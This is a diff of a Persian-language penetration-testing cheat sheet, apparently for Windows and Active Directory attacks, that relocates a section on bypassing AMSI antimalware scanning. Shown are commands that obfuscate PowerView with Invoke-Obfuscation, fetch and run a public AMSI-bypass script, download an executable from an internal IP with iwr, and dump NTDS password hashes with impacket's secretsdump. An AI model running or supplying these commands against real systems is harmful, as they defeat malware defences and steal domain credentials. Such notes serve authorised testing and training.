@@ -729,13 +729,21 @@ Step by step instructions on room362.com for step below
 | دریافت و ذخیره سازی فایل | iwr -uri http://10.10.10.10/file -o file.exe |
 
 
-
 ### دورزدن AMSI
 
 ```text
 Import-Module .\Invoke-Obfuscation\Invoke-Obfuscation.psm1
 Out-ObfuscatedTokenCommand -Path .\powerview.ps1 | Out-File out
 ```
+
+یا
+
+```text
+https://raw.githubusercontent.com/kmkz/Pentesting/master/AMSI-Bypass.ps1
+. .\AMSI-Bypass.ps1
+Invoke-AmsiBypass
+```
+
 
 ### دریافت اطلاعات هویتی AD با استفاده از doesnotrequirepreauth
 
@@ -1464,10 +1472,4 @@ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -
 hashes lmhash:nthash LOCAL -output nt-hash
 ```
 
-## بایپس Antimalware Scan
 
-```text
-https://raw.githubusercontent.com/kmkz/Pentesting/master/AMSI-Bypass.ps1
-. .\AMSI-Bypass.ps1
-Invoke-AmsiBypass
-```
